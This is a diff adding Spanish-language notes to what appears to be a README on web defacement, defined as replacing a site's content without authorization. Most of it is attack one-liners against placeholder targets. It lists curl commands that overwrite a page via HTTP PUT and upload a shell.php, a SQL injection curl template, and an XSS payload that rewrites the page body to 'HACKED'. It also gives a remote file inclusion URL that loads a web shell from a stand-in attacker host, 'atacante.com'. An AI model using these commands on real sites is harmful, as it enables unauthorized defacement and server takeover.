@@ -1,3 +1,34 @@
+## Defacement web; 
+
+modifica o reemplaza el contenido de un sitio web sin autorización
+
+## Metodos mas usados para deface web 
+
+## 1.- Metodo PUT
+
+curl -X PUT -d "@index25.htm" http://victima.com/index.htm
+
+## 2.-Metodo SQKi Inyección SQL
+
+curl -s "${URL}${VULN_PATH}${TEST_PAYLOAD}
+
+## 3.- Metodo upload, subir una shell.php
+
+curl -F "file=@shell.php" http://victima.com/upload
+
+## 4.- Metodo XSS
+
+<script>document.body.innerHTML = "HACKED";</script>
+
+## 5 - Metodo Vulnerabilidades en CMS (WordPress, Joomla, Drupal), credenciales debiles
+
+
+## 6.- Metodo remote File Inclusion (RFI) / Local File Inclusion (LFI)
+
+http://victima.com/index.php?page=http://atacante.com/shell.php
+
+
+
 ## Defacement WEB suite por HTTP Method PUT OPTIONS POST OSVDB-397
 
 curl -k -X PUT -T "/tmp/index2.htm" "https://IP/index2.htm" -vv
